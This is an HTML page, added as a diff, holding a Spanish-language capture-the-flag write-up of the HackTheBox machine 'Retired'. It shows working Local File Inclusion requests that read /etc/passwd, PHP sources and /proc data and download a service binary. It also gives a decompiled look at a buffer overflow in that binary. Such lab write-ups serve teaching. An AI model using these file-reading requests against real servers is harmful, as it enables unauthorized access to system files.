@@ -1,0 +1,1240 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Retired</title>
+
+  <meta name="description" content="Resolución de la máquina Retired de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Retired">
+  <meta name="twitter:description" content="Resolución de la máquina Retired de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/retired.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Retired">
+  <meta property="og:description" content="Resolución de la máquina Retired de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/retired.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/retired.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Retired" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-www-data">Shell - www-data</a></li>
+        <li><a href="#shell-dev">Shell - dev</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/retired.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Retired</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.154
+Nmap scan report for 10.10.11.154  
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Solo por comodidad agregamos el dominio <code class="language-plaintext highlighter-rouge">retired.htb</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, al visitar la pagina principal podemos ver que el archivo es gestionado mediante el parametro <code class="language-plaintext highlighter-rouge">page</code> en la petición <code class="language-plaintext highlighter-rouge">GET</code> el cual por defecto apunta a <code class="language-plaintext highlighter-rouge">default.html</code></p>
+<a href="/htb/retired/1.png" target="_blank"><div><p><img src="/htb/retired/1.png"></p></div></a>
+
+<p class="plain-text">Podemos probar un <code class="language-plaintext highlighter-rouge">Local File Inclusion</code> para apuntar a archivos locales de la máquina, en este caso logramos leer directamente el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=/etc/passwd"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">sh$  
+root:x:0:0:root:/root:/bin/ba</span><span class="ro">sh</span><span class="p">
+vagrant:x:1000:1000::/vagrant:/bin/ba</span><span class="ro">sh</span><span class="p">
+dev:x:1001:1001::/home/dev:/bin/ba</span><span class="ro">sh</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si revisamos el archivo <code class="language-plaintext highlighter-rouge">index.php</code> nos encontramos con que deberia haber una <code class="language-plaintext highlighter-rouge">sanitización</code> para el LFI sin embargo desde <code class="language-plaintext highlighter-rouge">curl</code> aunque tenemos un <code class="language-plaintext highlighter-rouge">302</code> nos detenemos justo antes de la redireccion a <code class="language-plaintext highlighter-rouge">default.html</code> y podemos ver el contenido</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=index.php"</span><span class="p">
+&lt?php
+</span><span class="o">function </span><span class="no">sanitize_input</span><span class="p">($</span><span class="am">param</span><span class="p">) {
+    $param1 </span><span class="o">= </span><span class="no">str_replace</span><span class="p">(</span><span class="s">"../"</span><span class="p">,</span><span class="s">""</span><span class="p">,$param);
+    $param2 </span><span class="o">= </span><span class="no">str_replace</span><span class="p">(</span><span class="s">"./"</span><span class="p">,</span><span class="s">""</span><span class="p">,$param1);
+    </span><span class="o">return </span><span class="p">$param2;
+}
+
+$page </span><span class="o">= </span><span class="p">$_GET[</span><span class="s">'page'</span><span class="p">];
+</span><span class="o">if</span><span class="p"> (</span><span class="o">isset</span><span class="p">($page) </span><span class="o">&& </span><span class="no">preg_match</span><span class="p">(</span><span class="s">"/</span><span class="o">^</span><span class="mi">[a-z]</span><span class="s">/"</span><span class="p">, $page)) {
+    $page </span><span class="o">= </span><span class="p">sanitize_input($page);
+} </span><span class="o">else</span><span class="p"> {
+    </span><span class="no">header</span><span class="p">(</span><span class="s">'Location: /index.php?page=default.html'</span><span class="p">);  
+}
+
+</span><span class="no">readfile</span><span class="p">($page);
+?></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por ahora buscaremos mas archivos con extensión <code class="language-plaintext highlighter-rouge">.html</code>, esto podemos bruteforcear usando <code class="language-plaintext highlighter-rouge">wfuzz</code> y un diccionario de rutas, nos encontramos con <code class="language-plaintext highlighter-rouge">beta</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://retired.htb/FUZZ.html -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://retired.htb/FUZZ.html
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000232:   </span><span class="ve">200</span><span class="p">        72 L     304 W      4144 Ch     "beta"
+000000822:   </span><span class="ve">200</span><span class="p">        188 L    824 W      11414 Ch    "default"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la página <code class="language-plaintext highlighter-rouge">beta.html</code> nos encontramos con un campo de subida de archivos, donde nos pide que subamos un archivo de <code class="language-plaintext highlighter-rouge">licencia</code> con un tamaño de <code class="language-plaintext highlighter-rouge">512</code> bytes</p>
+<a href="/htb/retired/2.png" target="_blank"><div><p><img src="/htb/retired/2.png"></p></div></a>
+
+<p class="plain-text">Subimos un archivo <code class="language-plaintext highlighter-rouge">test</code> y al interceptar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> vemos que la hace a <code class="language-plaintext highlighter-rouge">activate_license.php</code> enviando el contenido del archivo como <code class="language-plaintext highlighter-rouge">licensefile</code></p>
+<a href="/htb/retired/3.png" target="_blank"><div><p><img src="/htb/retired/3.png"></p></div></a>
+
+<p class="plain-text">Si miramos lo que hace el php toma el contenido del archivo <code class="language-plaintext highlighter-rouge">licensefile</code> que recibe en la petición y lo reenvia a el puerto <code class="language-plaintext highlighter-rouge">1337</code> de la <code class="language-plaintext highlighter-rouge">127.0.0.1</code> mediante un socket</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=activate_license.php"</span><span class="p">
+&lt?php
+</span><span class="o">if</span><span class="p">(</span><span class="o">isset</span><span class="p">($_FILES[</span><span class="s">'licensefile'</span><span class="p">])) {
+    $license      </span><span class="o">= </span><span class="no">file_get_contents</span><span class="p">($_FILES[</span><span class="s">'licensefile'</span><span class="p">][</span><span class="s">'tmp_name'</span><span class="p">]);
+    $license_size </span><span class="o">= </span><span class="p">$_FILES[</span><span class="s">'licensefile'</span><span class="p">][</span><span class="s">'size'</span><span class="p">];
+
+    $socket </span><span class="o">= </span><span class="no">socket_create</span><span class="p">(</span><span class="mi">AF_INET</span><span class="p">, </span><span class="mi">SOCK_STREAM</span><span class="p">, </span><span class="mi">SOL_TCP</span><span class="p">);
+    </span><span class="o">if </span><span class="p">(</span><span class="o">!</span><span class="p">$socket) { </span><span class="o">echo </span><span class="s">"error socket_create()</span><span class="mi">\n</span><span class="s">"</span><span class="p">; }
+
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="no">socket_connect</span><span class="p">($socket, </span><span class="s">'127.0.0.1'</span><span class="p">, </span><span class="mi">1337</span><span class="p">)) {
+        </span><span class="o">echo </span><span class="s">"error socket_connect()" </span><span class="o">. </span><span class="no">socket_strerror</span><span class="p">(</span><span class="no">socket_last_error</span><span class="p">()) </span><span class="o">.</span><span class="s"> "</span><span class="mi">\n</span><span class="s">"</span><span class="p">;  
+    }
+
+    </span><span class="no">socket_write</span><span class="p">($socket, </span><span class="no">pack</span><span class="p">(</span><span class="s">"N"</span><span class="p">, $license_size));
+    </span><span class="no">socket_write</span><span class="p">($socket, $license);
+
+    </span><span class="no">socket_shutdown</span><span class="p">($socket);
+    </span><span class="no">socket_close</span><span class="p">($socket);
+}
+?></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">/proc/sched_debug</code> encontramos información sobre los <code class="language-plaintext highlighter-rouge">procesos</code> corriendo, si grepeamos por <code class="language-plaintext highlighter-rouge">activate</code> encontramos uno correspondiente al pid <code class="language-plaintext highlighter-rouge">400</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=/proc/sched_debug"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">activate
+ S </span><span class="ro">activate</span><span class="p">_licens   400     15754.825063        23   120         0.000000         5.085409         0.000000 0 0 /  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si descargamos el archivo <code class="language-plaintext highlighter-rouge">cmdline</code> del proceso que corresponde al pid <code class="language-plaintext highlighter-rouge">400</code> podemos ver el comando con el que se <code class="language-plaintext highlighter-rouge">ejecuto</code> el archivo que creo el proceso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://retired.htb/?page=/proc/400/cmdline"</span><span class="p"> -o cmdline  
+
+</span><span class="ve">❯ cat </span><span class="p">cmdline
+/usr/bin/activate_license1337</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">xxd</code> el cmdline nos encontramos que entre <code class="language-plaintext highlighter-rouge">activate_license</code> y <code class="language-plaintext highlighter-rouge">1337</code> hay un <code class="language-plaintext highlighter-rouge">.</code> que es igual a un espacio lo que significa que 1337 es un <code class="language-plaintext highlighter-rouge">argumento</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ xxd </span><span class="p">cmdline
+00000000: 2f75 7372 2f62 696e 2f61 6374 6976 6174  /usr/bin/activat  
+00000010: 655f 6c69 6365 6e73 6500 3133 3337 00    e_license.1337.</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-www-data">
+<br><h3 class="post-title">Shell - www-data</h3><br>
+
+<p class="plain-text">Para ver en que consiste el programa que se ejecuta en el puerto <code class="language-plaintext highlighter-rouge">1337</code> descargamos con curl el archivo <code class="language-plaintext highlighter-rouge">activate_license</code> para poder analizarlo en local mas adelante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=/usr/bin/activate_license"</span><span class="p"> -o activate_license  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otorgamos permisos de ejecución a este y al ejecutarlo nos pide un <code class="language-plaintext highlighter-rouge">argumento</code>, como en el cmdline le pasaremos el <code class="language-plaintext highlighter-rouge">1337</code>, al hacerlo empieza un <code class="language-plaintext highlighter-rouge">listener</code> en este</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chmod </span><span class="p">+x activate_license
+
+</span><span class="ve">❯ ./activate_license</span><span class="p">
+Error: specify port to bind to
+
+</span><span class="ve">❯ ./activate_license </span><span class="p">1337
+[+] starting server listening on port 1337  
+[+] listening ...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para analizar mejor podemos decompilarlo con <code class="language-plaintext highlighter-rouge">ghidra</code> y ver su codigo en <code class="language-plaintext highlighter-rouge">C</code></p>
+<a href="/htb/retired/7.png" target="_blank"><div><p><img src="/htb/retired/7.png"></p></div></a>
+
+<p class="plain-text">El codigo comprueba que tenga un <code class="language-plaintext highlighter-rouge">argumento</code> e inicia un simple <code class="language-plaintext highlighter-rouge">listener</code> con el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">,</span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">)
+
+{
+  </span><span class="no">int </span><span class="p">iVar1;
+  __pid_t _Var2;
+  </span><span class="no">int </span><span class="o">*</span><span class="p">piVar3;
+  </span><span class="no">char </span><span class="o">*</span><span class="p">pcVar4;
+  </span><span class="no">char </span><span class="p">clientaddr_s [</span><span class="mi">16</span><span class="p">];
+  sockaddr_in clientaddr;
+  socklen_t clientaddrlen;
+  sockaddr_in server;
+  </span><span class="na">uint16_t </span><span class="p">port;
+  </span><span class="no">int </span><span class="p">clientfd;
+  </span><span class="no">int </span><span class="p">serverfd;
+
+  </span><span class="o">if</span><span class="p"> (argc </span><span class="o">!= </span><span class="mi">2</span><span class="p">) {
+    error(</span><span class="s">"specify port to bind to"</span><span class="p">);
+  }
+  iVar1 </span><span class="o">=</span><span class="p"> __isoc99_sscanf(argv[</span><span class="mi">1</span><span class="p">],</span><span class="o">&</span><span class="p">DAT_00102100,</span><span class="o">&</span><span class="p">port);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">== -</span><span class="mi">1</span><span class="p">) {
+    piVar3 </span><span class="o">=</span><span class="p"> __errno_location();
+    pcVar4 </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">piVar3);
+    error(pcVar4);
+  }
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] starting server listening on port </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">,(ulong)port);
+  server.sin_family </span><span class="o">= </span><span class="mi">2</span><span class="p">;
+  server.sin_addr.s_addr </span><span class="o">= </span><span class="p">htonl(</span><span class="mi">0x7f000001</span><span class="p">);
+  server.sin_port </span><span class="o">= </span><span class="p">htons(port);
+  serverfd </span><span class="o">= </span><span class="p">socket(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> (serverfd </span><span class="o">== -</span><span class="mi">1</span><span class="p">) {
+    piVar3 </span><span class="o">=</span><span class="p"> __errno_location();
+    pcVar4 </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">piVar3);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">bind(serverfd,(sockaddr </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">server,</span><span class="mi">0x10</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">== -</span><span class="mi">1</span><span class="p">) {
+    piVar3 </span><span class="o">=</span><span class="p"> __errno_location();
+    pcVar4 </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">piVar3);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">listen(serverfd,</span><span class="mi">100</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">== -</span><span class="mi">1</span><span class="p">) {
+    piVar3 </span><span class="o">=</span><span class="p"> __errno_location();
+    pcVar4 </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">piVar3);
+    error(pcVar4);
+  }
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"[+] listening ..."</span><span class="p">);
+  </span><span class="o">while</span><span class="p">( </span><span class="mi">true</span><span class="p"> ) {
+    </span><span class="o">while</span><span class="p">( </span><span class="mi">true</span><span class="p"> ) {
+      clientfd </span><span class="o">= </span><span class="p">accept(serverfd,(sockaddr </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">clientaddr,</span><span class="o">&</span><span class="p">clientaddrlen);
+      </span><span class="o">if</span><span class="p"> (clientfd </span><span class="o">!= -</span><span class="mi">1</span><span class="p">) </span><span class="o">break</span><span class="p">;
+      </span><span class="no">fwrite</span><span class="p">(</span><span class="s">"Error: accepting client</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0x18</span><span class="p">,stderr);
+    }
+    inet_ntop(</span><span class="mi">2</span><span class="p">,</span><span class="o">&</span><span class="p">clientaddr.sin_addr,clientaddr_s,</span><span class="p">0x10</span><span class="p">);
+    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] accepted client connection from </span><span class="mi">%s</span><span class="s">:</span><span class="mi">%d\n</span><span class="s">"</span><span class="p">,clientaddr_s,(ulong)clientaddr.sin_port);  
+    _Var2 </span><span class="o">= </span><span class="p">fork();
+    </span><span class="o">if</span><span class="p"> (_Var2 </span><span class="o">== </span><span class="mi">0</span><span class="p">) </span><span class="o">break</span><span class="p">;
+    __sysv_signal(</span><span class="mi">0x11</span><span class="p">,(__sighandler_t)</span><span class="mi">0x1</span><span class="p">);
+    close(clientfd);
+  }
+  close(serverfd);
+  activate_license(clientfd);
+                    </span><span class="c1">/* WARNING: Subroutine does not return */
+  </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Define como <code class="language-plaintext highlighter-rouge">clientfd</code> aquello que recibe del socket en este caso del puerto <code class="language-plaintext highlighter-rouge">1337</code>, despues llama a la función <code class="language-plaintext highlighter-rouge">activate_license</code> pasandole clientfd como <code class="language-plaintext highlighter-rouge">argumento</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">clientfd </span><span class="o">= </span><span class="p">accept(serverfd,(sockaddr </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">clientaddr,</span><span class="o">&</span><span class="p">clientaddrlen);  
+activate_license(clientfd);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">activate_license</code> recibe como argumento <code class="language-plaintext highlighter-rouge">sockfd</code>, despues realiza algunas operaciones con la <code class="language-plaintext highlighter-rouge">licencia</code> que recibe, mediante <code class="language-plaintext highlighter-rouge">sqlite3</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void </span><span class="na">activate_license</span><span class="p">(</span><span class="no">int </span><span class="am">sockfd</span><span class="p">)
+
+{
+  </span><span class="no">int </span><span class="p">iVar1;
+  </span><span class="na">ssize_t </span><span class="p">sVar2;
+  </span><span class="no">int </span><span class="o">*</span><span class="p">piVar3;
+  </span><span class="no">char </span><span class="o">*</span><span class="p">pcVar4;
+  sqlite3_stmt </span><span class="o">*</span><span class="p">stmt;
+  sqlite3 </span><span class="o">*</span><span class="p">db;
+  </span><span class="na">uint32_t </span><span class="p">msglen;
+  </span><span class="no">char </span><span class="p">buffer [</span><span class="mi">512</span><span class="p">];
+
+  sVar2 </span><span class="o">= </span><span class="p">read(sockfd,</span><span class="o">&</span><span class="p">msglen,</span><span class="mi">4</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> (sVar2 </span><span class="o">== -</span><span class="mi">1</span><span class="p">) {
+    piVar3 </span><span class="o">=</span><span class="p"> __errno_location();
+    pcVar4 </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">piVar3);
+    error(pcVar4);
+  }
+  msglen </span><span class="o">= </span><span class="p">ntohl(msglen);
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] reading </span><span class="mi">%d</span><span class="s"> bytes</span><span class="mi">\n</span><span class="s">"</span><span class="p">,(ulong)msglen);
+  sVar2 </span><span class="o">= </span><span class="p">read(sockfd,buffer,(ulong)msglen);
+  </span><span class="o">if</span><span class="p"> (sVar2</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) {
+    piVar3 </span><span class="o">=</span><span class="p"> __errno_location();
+    pcVar4 </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">piVar3);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">sqlite3_open(</span><span class="s">"license.sqlite"</span><span class="p">,</span><span class="o">&</span><span class="p">db);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) {
+    pcVar4 </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
+    error(pcVar4);
+  }
+  sqlite3_busy_timeout(db,</span><span class="mi">2000</span><span class="p">);
+  iVar1 </span><span class="o">= </span><span class="p">sqlite3_exec(db,
+                       </span><span class="s">"CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,    license_key TEXT)"  </span><span class="p">
+                       ,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) {
+    pcVar4 </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">sqlite3_prepare_v2(db,</span><span class="s">"INSERT INTO license (license_key) VALUES (?)"</span><span class="p">,</span><span class="mi">0xffffffff</span><span class="p">,</span><span class="o">&</span><span class="p">stmt,</span><span class="mi">0</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) {
+    pcVar4 </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">sqlite3_bind_text(stmt,</span><span class="mi">1</span><span class="p">,buffer,</span><span class="mi">0x200</span><span class="p">,</span><span class="mi">0</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) {
+    pcVar4 </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">sqlite3_step(stmt);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">!= </span><span class="mi">0x65</span><span class="p">) {
+    pcVar4 </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">sqlite3_reset(stmt);
+  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="mi">!= </span><span class="mi">0</span><span class="p">) {
+    pcVar4 </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">sqlite3_finalize(stmt);
+  </span><span class="o">if</span><span class="p"> (iVar1 != 0) {
+    pcVar4 </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
+    error(pcVar4);
+  }
+  iVar1 </span><span class="o">= </span><span class="p">sqlite3_close(db);
+  </span><span class="o">if </span><span class="p">(iVar1 </span><span class="o">!= </span><span class="mi">0</span><span class="p">) {
+    pcVar4 </span><span class="o">= </span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
+    error(pcVar4);
+  }
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] activated license: </span><span class="mi">%s\n</span><span class="s">"</span><span class="p">,buffer);
+  </span><span class="o">return</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La vulnerabilidad viene del definir un <code class="language-plaintext highlighter-rouge">buffer</code> de solo <code class="language-plaintext highlighter-rouge">512</code> bytes para <code class="language-plaintext highlighter-rouge">sockfd</code> que es la <code class="language-plaintext highlighter-rouge">licencia</code> que recibe del socket ya que puede convertirse en un <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">char </span><span class="p">buffer [</span><span class="mi">512</span><span class="p">];
+sVar2 </span><span class="o">= </span><span class="p">read(sockfd,buffer,(ulong)msglen);  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes de explotarlo es necesario revisas las <code class="language-plaintext highlighter-rouge">protecciones</code> del binario con <code class="language-plaintext highlighter-rouge">checksec</code>, casi todas estan habilitadas, entre ellas <code class="language-plaintext highlighter-rouge">NX</code> que impide la ejecución en la pila</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">activate_license
+[</span><span class="az">*</span><span class="p">] '/home/kali/activate_license'  
+    Arch:     amd64-64-little
+    RELRO:    </span><span class="ve">Full RELRO</span><span class="p">
+    Stack:    </span><span class="ro">No canary found</span><span class="p">
+    NX:       </span><span class="ve">NX enabled</span><span class="p">
+    PIE:      </span><span class="ve">PIE enabled</span>
+</code></pre></div></div><br>
+
